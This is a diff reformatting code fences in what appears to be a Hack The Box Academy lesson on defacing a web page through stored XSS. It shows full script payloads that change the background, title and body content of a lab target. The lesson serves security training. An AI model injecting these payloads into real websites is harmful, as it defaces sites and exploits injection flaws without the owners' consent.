@@ -31,8 +31,7 @@ Let's go back to our `Stored XSS` exercise and use it as a basis for our attack.
 
 To change a web page's background, we can choose a certain color or use an image. We will use a color as our background since most defacing attacks use a dark color for the background. To do so, we can use the following payload:
 
-```
-        html
+```html
 <script>document.body.style.background = "#141d2b"</script>
 ```
 
@@ -48,8 +47,7 @@ This will be persistent through page refreshes and will appear for anyone who vi
 
 Another option would be to set an image to the background using the following payload:
 
-```
-        html
+```html
 <script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
 ```
 
@@ -61,8 +59,7 @@ Try using the above payload to see how the final result may look.
 
 We can change the page title from `2Do` to any title of our choosing, using the `document.title` JavaScript property:
 
-```
-        html
+```html
 <script>document.title = 'HackTheBox Academy'</script>
 ```
 
@@ -78,22 +75,19 @@ http://SERVER\_IP:PORT/
 
 When we want to change the text displayed on the web page, we can utilize various JavaScript functions for doing so. For example, we can change the text of a specific HTML element/DOM using the `innerHTML` property:
 
-```
-        javascript
+```javascript
 document.getElementById("todo").innerHTML = "New Text"
 ```
 
 We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the `jQuery` library must have been imported within the page source):
 
-```
-        javascript
+```javascript
 $("#todo").html('New Text');
 ```
 
 This gives us various options to customize the text on the web page and make minor adjustments to meet our needs. However, as hacking groups usually leave a simple message on the web page and leave nothing else on it, we will change the entire HTML code of the main `body`, using `innerHTML`, as follows:
 
-```
-        javascript
+```javascript
 document.getElementsByTagName('body')[0].innerHTML = "New Text"
 ```
 
@@ -101,8 +95,7 @@ As we can see, we can specify the `body` element with `document.getElementsByTag
 
 For our exercise, we will borrow the HTML code from the main page of `Hack The Box Academy`:
 
-```
-        html
+```html
 <center>
     <h1 style="color: white">Cyber Security Training</h1>
     <p style="color: white">by 
@@ -115,8 +108,7 @@ For our exercise, we will borrow the HTML code from the main page of `Hack The B
 
 We will minify the HTML code into a single line and add it to our previous XSS payload. The final payload should be as follows:
 
-```
-        html
+```html
 <script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
 ```
 
@@ -128,8 +120,7 @@ http://SERVER\_IP:PORT/
 
 By using three XSS payloads, we were able to successfully deface our target web page. If we look at the source code of the web page, we will see the original source code still exists, and our injected payloads appear at the end:
 
-```
-        html
+```html
 <div></div><ul class="list-unstyled" id="todo"><ul>
 <script>document.body.style.background = "#141d2b"</script>
 </ul><ul><script>document.title = 'HackTheBox Academy'</script>
